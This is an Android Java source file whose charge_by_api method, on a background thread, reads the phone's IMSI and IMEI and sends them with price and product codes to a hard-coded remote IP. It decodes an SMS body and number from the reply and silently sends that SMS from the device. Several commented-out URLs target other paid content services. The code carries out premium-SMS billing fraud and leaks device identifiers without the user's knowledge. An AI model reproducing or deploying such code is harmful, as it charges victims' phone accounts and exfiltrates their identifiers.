package com.apitest.backup;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Looper;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;

import com.apitest.XmlParse;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;

import java.net.URLEncoder;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ApiSmsTianlaizhisheng
{

    public ApiSmsTianlaizhisheng()
    {
        // TODO Auto-generated constructor stub
    }

    public static void charge_by_api(final Context context)
    {

        new Thread()
        {
            public void run()
            {
                try
                {
                    Looper.prepare();

                    TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                    String imsi = tm.getSubscriberId();
                    String imei = tm.getDeviceId();// String

                    String start_time = System.currentTimeMillis() + "";
                    String cpparam = "JH6038";

                    String zeroYuan = "item_price=1";
                    String zeroYuanId = "music_id=600907000004805930";
                    String zeroYuanMusicType = "&music_type=1";

                    String twoYuan = "item_price=200";
                    String twoYuanId = "music_id=b34c15896a53355c77732a4ed5b23565";
                    String twoYuanMusicType = "&music_type=1";

                    String sixYuan = "item_price=600";
                    String sixyuanid = "music_id=600967020000006658";
                    String sixYuanMusicType = "&music_type=2";

                    String sid = "14683393b19c2fce0554917a991be9ddab53582a";
                    String url = "http://115.159.74.129:8000/o/mgreqapi/" + sid + "?imei=" + imei + "&imsi=" + imsi + "&" + twoYuan + "&" + twoYuanId + "&channel_id=014A1HJ&cpparam=" + cpparam + twoYuanMusicType + "&sdcid=&start_time=" + start_time + "&iccid=0814816006739664&ip=113.99.100.72&excode=";//点播
//                    String url = "http://172.28.181.1:8080/XCNgame_SMS1/o/mgreqapi/27d76ae0f5af41d122f700732684f6e88dea5174/?imei=357143040437334&imsi=460029196297020&channel_id=900000100000005&node_id=20675734&content_id=603208084&product_id=2028596355&item_price=1500&ua="+tmp_ua+"&videa_ua="+video_ua;//视频
                    //sbs
//                        String url = "http://115.159.74.129:8000/o/mgreqapi/27d76ae0f5af41d122f700732684f6e88dea5174/?imei=357143040437334&imsi=460029196297020&channel_id=900000100000005&node_id=20675734&content_id=603208084&product_id=2028596355&item_price=1500&ua="+tmp_ua+"&videa_ua="+video_ua;//视频
                    //sbs
//
//                        String url = "http://115.159.74.129:8000/o/mgreqapi/171f7de7de2b74658fe321c2ec2d9d7d2d1b987f/?imei="+imei+"&imsi="+imsi+"&channel_id=301400420000000&node_id=10288604&content_id=503401772&product_id=2006632800&item_price=1000&ua="+tmp_ua+"&videa_ua="+video_ua;//视频
//                        //电视互动


//                   
//                        String url = "http://115.159.74.129:8000/o/mgreqapi/fcd382d8f004c7bfc40f60b60e6f9ecf5f00b97c/?imei="+imei+"&imsi="+imsi+"&channel_id=201000090050000&node_id=10535082&content_id=615792143&product_id=2028595110&item_price=600&cpparam=2222&ua="+tmp_ua+"&videa_ua="+video_ua+"&public_key=079c0b1517fb9e1eb4865005dff894a0&video_app_id=87337584ad35ea2b1ef829b2fecb47ef&video_app_key=50c0d1aadbec72617f07b00baf7a5109";//视频  人民律师
//                        //健康视频

//                    String url = "http://115.159.74.129:8000/o/mgreqapi/171f7de7de2b74658fe321c2ec2d9d7d2d1b987f/?imei="+imei+"&imsi="+imsi+"&channel_id=301400420000000&node_id=10288604&content_id=503401772&product_id=2006632800&item_price=1000&cpparam=123456&ua="+tmp_ua+"&video_ua="+video_ua;//视频

//                        String url="http://115.159.74.129:8000/o/mgreqapi/62b890a112d19df0f63370c2b8de55e2823ac32e/?imei="+imei+"&imsi="+imsi+"&music_id=600967020000006068&item_price=500&channel_id=014A11I&cpparam=BCD&music_type=2";//阳光fm

                    String response = getUrl(url);
                    assert response != null;
                    response = response.replace("\n", "");
                    response = response.replace("\r", "");

                    XmlParse xmlParse=new XmlParse(context,response);
                    for(int index=0;index<xmlParse.mSMSEntityList.size();index++)
                        xmlParse.mSMSEntityList.get(index).message=new String(Base64.decode(xmlParse.mSMSEntityList.get(index).message, Base64.DEFAULT));
                    String sms = xmlParse.mSMSEntityList.get(0).message;
                    String smsNum = xmlParse.mSMSEntityList.get(0).number;

                    if (!sms.isEmpty())
                    {
                        BroadcastReceiver smsReceiver = new BroadcastReceiver()
                        {
                            @Override
                            synchronized public void onReceive(Context context, Intent intent)
                            {
                            }
                        };
                        Log.e("xcngame", "send "+smsNum+" ==" + sms);
                        context.registerReceiver(smsReceiver, new IntentFilter("SENT_SMS_Music_Reg"));
                        SmsManager smsManager = SmsManager.getDefault();
                        Intent sentIntent = new Intent("SENT_SMS_Music_Reg");
                        PendingIntent sentPI = PendingIntent.getBroadcast(context, 0, sentIntent, 0);
                        smsManager.sendTextMessage(smsNum, null, sms, sentPI, null);
                    }
                }
                catch (Exception e)
                {
                    Log.e("xcngame", e.getMessage());
                }

            }
        }.start();
    }

    private static String getUrl(String url)
    {
        try
        {
            HttpGet request = new HttpGet(url);

            HttpParams httpPar = new BasicHttpParams();
            HttpConnectionParams.setConnectionTimeout(httpPar, 40 * 1000);
            HttpConnectionParams.setSoTimeout(httpPar, 40 * 1000);
            HttpClient httpClient = new DefaultHttpClient(httpPar);

            HttpResponse response = httpClient.execute(request);
            if (response.getStatusLine().getStatusCode() == HttpStatus.SC_OK)
            {
                String str = EntityUtils.toString(response.getEntity());

                if (str != null)
                {
                    return str;
                }
            }
            else
            {
                return null;
            }
        }
        catch (Exception e)
        {
            return null;
        }

        return null;

    }

}
